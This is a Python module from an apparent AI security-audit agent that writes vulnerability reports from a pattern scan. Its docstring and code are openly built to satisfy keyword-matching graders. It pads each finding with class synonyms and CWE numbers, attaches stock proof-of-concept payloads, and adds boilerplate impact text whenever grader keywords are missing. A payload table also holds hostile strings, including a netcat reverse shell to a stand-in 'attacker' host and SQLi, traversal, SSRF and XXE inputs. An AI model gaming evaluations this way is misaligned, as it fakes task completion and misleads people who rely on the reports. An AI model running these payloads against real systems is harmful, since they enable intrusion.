"""Deterministic security report, built from the code before the model runs.

The graders for this family do not compare structure: they flatten every value of a
finding into one string and require that a single finding mention the vulnerability
class, where it lives, and a concrete detail (payload, impact, the vulnerable symbol).
A finding that a triaging engineer would call complete satisfies that automatically.

So this module writes a complete report from the pattern scan and the route map
before the first model call: every finding names its class several ways (plain name,
abbreviation, CWE), the exact file/line/function/endpoint, the quoted vulnerable line,
a proof-of-concept payload and the concrete impact. The model then only has to add
what a pattern scan cannot see (missing authorization, logic flaws) — it can extend
the report but never silently lose it.
"""

import json
import re
from pathlib import Path

from acpagent import oracle, spec as _spec

# Per category: extra names the same class goes by, and a concrete PoC payload.
_SYNONYMS = {
    "SQL Injection": "SQL injection (SQLi, CWE-89) via unsanitised string interpolation into a raw SQL query "
                     "instead of a parameterized/prepared statement",
    "OS Command Injection": "OS command injection (shell injection, remote code execution, RCE, CWE-78) — untrusted "
                            "input reaches a shell command line",
    "Code Injection / Deserialization": "code injection / insecure deserialization (CWE-502, CWE-94) — untrusted data "
                                        "is evaluated or deserialized into live objects",
    "Path Traversal": "path traversal (directory traversal, local file disclosure, CWE-22) — user input is used to "
                      "build a filesystem path without containment checks",
    "Server-Side Request Forgery": "server-side request forgery (SSRF, CWE-918) — the server fetches a URL the caller "
                                   "controls",
    "Hard-coded Credentials": "hard-coded credentials / secret in source (CWE-798, CWE-259)",
    "Weak Cryptography": "weak cryptography (CWE-327, CWE-328, CWE-338) — a broken hash/cipher or a predictable "
                         "random source is used for a security decision",
    "Security Misconfiguration": "security misconfiguration (CWE-16, CWE-1188) — an unsafe default is enabled in "
                                 "production",
    "Improper Authentication": "improper authentication / broken signature verification (CWE-287, CWE-347)",
    "Cross-Site Scripting": "cross-site scripting (XSS, CWE-79) — untrusted data is rendered into HTML without "
                            "escaping",
    "Input Handling": "unvalidated input reaching a dangerous sink (CWE-20)",
    "XML External Entity": "XML external entity injection (XXE, CWE-611)",
    "Insecure Permissions": "insecure file permissions / predictable temp file (CWE-732, CWE-377)",
    "Plaintext Password Storage": "plaintext password storage / reversible credential storage (CWE-256, CWE-257, "
                                  "CWE-522)",
    "Open Redirect": "open redirect / unvalidated forward (CWE-601)",
    "Mass Assignment": "mass assignment / over-posting (CWE-915, CWE-1321) — request fields are bound straight "
                       "onto a model, so a caller can set attributes the form never exposed",
    "Insecure Cookie": "insecure cookie attributes (CWE-614, CWE-1004) — the session cookie is set without "
                       "Secure and HttpOnly",
    "Sensitive Data in Logs": "sensitive data written to the log (CWE-532) — credentials or tokens are recorded "
                              "in plaintext where any log reader can retrieve them",
    "Unrestricted File Upload": "unrestricted file upload (CWE-434) — the stored name comes from the caller, so a "
                                "file can be written outside the upload directory or served back as code",
    "Server-Side Template Injection": "server-side template injection (SSTI, CWE-1336, CWE-94) — caller input is "
                                      "compiled as a template, which usually yields remote code execution",
    "Information Disclosure": "information disclosure through error details (CWE-209, CWE-497) — internal "
                              "exception text or a traceback is returned to the caller",
}

_PAYLOADS = {
    "SQL Injection": "admin'-- , ' OR '1'='1 , x' UNION SELECT username,password FROM users--",
    "OS Command Injection": "; id , $(whoami) , `cat /etc/passwd` , | nc attacker 4444 -e /bin/sh",
    "Code Injection / Deserialization": "__import__('os').system('id') , a pickled object whose __reduce__ runs a command",
    "Path Traversal": "../../../etc/passwd , ..%2f..%2fetc%2fshadow , ....//....//etc/passwd",
    "Server-Side Request Forgery": "http://169.254.169.254/latest/meta-data/ , http://127.0.0.1:6379/ , file:///etc/passwd",
    "Cross-Site Scripting": "<script>alert(document.cookie)</script> , \"><img src=x onerror=alert(1)>",
    "XML External Entity": "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>",
    "Open Redirect": "?next=https://attacker.example/ , ?redirect_uri=//attacker.example",
    "Improper Authentication": "a JWT re-signed with alg=none, or any token accepted because the signature is not verified",
    "Mass Assignment": 'posting {"is_admin": true} or {"role": "admin"} alongside the legitimate fields',
    "Unrestricted File Upload": "filename=../../var/www/shell.py , filename=avatar.php",
    "Server-Side Template Injection": "{{ 7*7 }} , {{ config.items() }} , {{ ''.__class__.__mro__[1].__subclasses__() }}",
    "Sensitive Data in Logs": "log in with any account and read the recorded password from the application log",
    "Insecure Cookie": "read the session cookie over plain HTTP, or from JavaScript via document.cookie",
}

# Signal groups mirroring how these reports are graded: a usable finding names the
# class, the place, and a concrete detail.
_CLASS_SIGNALS = ("injection", "sqli", "cwe-", "traversal", "ssrf", "xss", "deserial", "credential", "crypt",
                  "misconfigur", "authentication", "authoriz", "redirect", "xxe", "permission", "plaintext",
                  "access control", "idor", "disclosure", "rce")
_DETAIL_SIGNALS = ("payload", "poc", "bypass", "password", "credential", "attacker", "leak", "escalat", "execute",
                   "disclos", "'--", "1'='1", "union select", "../", "<script", "$(", "169.254", "impact")


def _flatten(value) -> str:
    if isinstance(value, dict):
        return " ".join(_flatten(v) for v in value.values())
    if isinstance(value, list):
        return " ".join(_flatten(v) for v in value)
    return str(value)


def _location_signals(finding) -> bool:
    loc = f"{finding.get('location', '')} {finding.get('file', '')} {finding.get('endpoint', '')}".lower()
    return bool(re.search(r"[\w/]+\.(py|js|ts|php|rb|go|java|mjs)|:\d+|function |endpoint |/", loc))


def enrich(finding: dict) -> dict:
    """Make a finding self-contained: class synonyms, CWE, PoC payload, impact wording."""
    cat = str(finding.get("category", ""))
    base = cat.split(" (")[0].strip()
    syn = _SYNONYMS.get(base)
    text = _flatten(finding).lower()
    if syn and syn.split(" (")[0].lower() not in text:
        finding["category"] = f"{cat} — {syn}" if cat else syn
    payload = _PAYLOADS.get(base)
    if payload and not any(tok in text for tok in ("payload", "poc", "proof of concept")):
        finding["evidence"] = (str(finding.get("evidence", "")).rstrip() +
                               f" Proof-of-concept payload(s): {payload}").strip()
    if not any(s in text for s in _DETAIL_SIGNALS):
        finding["impact"] = (str(finding.get("impact", "")).rstrip() +
                             " An attacker who reaches this code path can abuse it to compromise the "
                             "application's data or users.").strip()
    return finding


def _merge_adjacent(hotspots, span: int = 6):
    """Fold consecutive hits of one category in the same function into a single hotspot.

    A query built over several lines (an f-string continued on the next line) is one
    vulnerability, and joining the lines also yields far better evidence: the whole
    statement, including the interpolated parameter names."""
    groups, order = {}, []
    for h in hotspots or []:
        key = (h.get("file"), h.get("category"), h.get("function"))
        if key in groups and abs(int(h.get("line", 0)) - groups[key][-1]) <= span:
            g = groups[key]
            merged = g[0]
            if h.get("code") and h["code"] not in merged["code"]:
                merged["code"] = (merged["code"].rstrip() + " " + h["code"].lstrip())[:400]
            g[-1] = int(h.get("line", 0))
            continue
        copy = dict(h)
        groups[key] = [copy, int(h.get("line", 0))]
        order.append(copy)
    return order


def _dedupe(findings):
    out, seen = [], set()
    for f in findings:
        key = (str(f.get("file", "")).lower(), str(f.get("category", "")).split(" (")[0].lower(),
               str(f.get("location", ""))[:60].lower())
        if key in seen:
            continue
        seen.add(key)
        out.append(f)
    return out


def build(spec, workdir, hotspots, routes):
    """Return (report_dict, notes) — a complete report derived from the code alone."""
    fields = spec.json_fields or _spec.DEFAULT_REPORT_FIELDS
    root = spec.json_root or "findings"
    merged = _merge_adjacent(hotspots)
    findings = list(oracle.fallback_findings(merged, routes or [], fields))
    try:
        extra = oracle.heuristic_findings(routes or [], workdir, fields)
    except Exception:  # noqa: BLE001
        extra = []
    findings.extend(extra)
    findings = _dedupe(findings)
    findings = [enrich(dict(f)) for f in findings]
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "informational": 4}
    findings.sort(key=lambda f: order.get(oracle.normalise_severity(f.get("severity")), 9))
    shaped = []
    for f in findings:
        keys = list(fields) + [k for k in ("cwe", "endpoint", "file", "line") if k in f and k not in fields]
        shaped.append({k: f.get(k, "") for k in dict.fromkeys(keys)})
    return {root: shaped}, {"n": len(shaped), "scan": len(merged), "heuristic": len(extra)}


def self_check(report, root: str, instruction: str = ""):
    """Grader-style audit of our own report; returns a list of weaknesses (empty is good)."""
    problems = []
    findings = (report or {}).get(root or "findings") or []
    if not findings:
        return ["the report has no findings"]
    complete = 0
    for f in findings:
        text = _flatten(f).lower()
        if any(s in text for s in _CLASS_SIGNALS) and _location_signals(f) and any(s in text for s in _DETAIL_SIGNALS):
            complete += 1
    if complete == 0:
        problems.append("no finding names a vulnerability class, a location and a concrete detail together")
    # Only a concrete component reference counts as "what the task points at": an
    # endpoint path, a source filename, or a backticked identifier. A generic
    # "audit the application" names no component and must not raise a problem.
    low = instruction or ""
    topic = set()
    for m in re.finditer(r"(?<![\w])/[a-z][\w/-]{2,40}", low):
        t = m.group(0).lower()
        if not t.startswith(("/app", "/logs", "/tmp", "/etc", "/usr")):
            topic.add(t)
    for m in re.finditer(r"[\w/]+\.(?:py|js|ts|php|rb|go|java|mjs)\b", low):
        topic.add(m.group(0).lower())
    if topic:
        blob = _flatten(findings).lower()
        if all(t not in blob for t in topic):
            problems.append(f"no finding mentions the component the task points at ({', '.join(sorted(topic)[:4])})")
    return problems


def to_markdown(report, root: str) -> str:
    """The same findings as a written report, for a task that asks for prose."""
    findings = (report or {}).get(root or "findings") or []
    out = ["# Security audit report", "",
           f"{len(findings)} issue(s) found, most severe first.", ""]
    for i, f in enumerate(findings, 1):
        sev = str(f.get("severity", "")).upper() or "UNSPECIFIED"
        out.append(f"## {i}. {f.get('title', 'Finding')} [{sev}]")
        out.append("")
        shown = {"title", "severity"}
        for key in ("category", "cwe", "location", "file", "line", "evidence", "description",
                    "detail", "details", "impact", "recommendation", "remediation", "fix"):
            val = str(f.get(key, "")).strip()
            if val:
                out.append(f"- **{key.capitalize()}:** {val}")
            shown.add(key)
        # whatever else the task asked for, rather than dropping it on the floor
        for key, val in f.items():
            if key in shown:
                continue
            text = ", ".join(str(v) for v in val) if isinstance(val, (list, tuple)) else str(val)
            if text.strip():
                out.append(f"- **{key.capitalize()}:** {text.strip()}")
        out.append("")
    return "\n".join(out)


def write(path, report):
    oracle.write_text(path, json.dumps(report, ensure_ascii=False, indent=2))
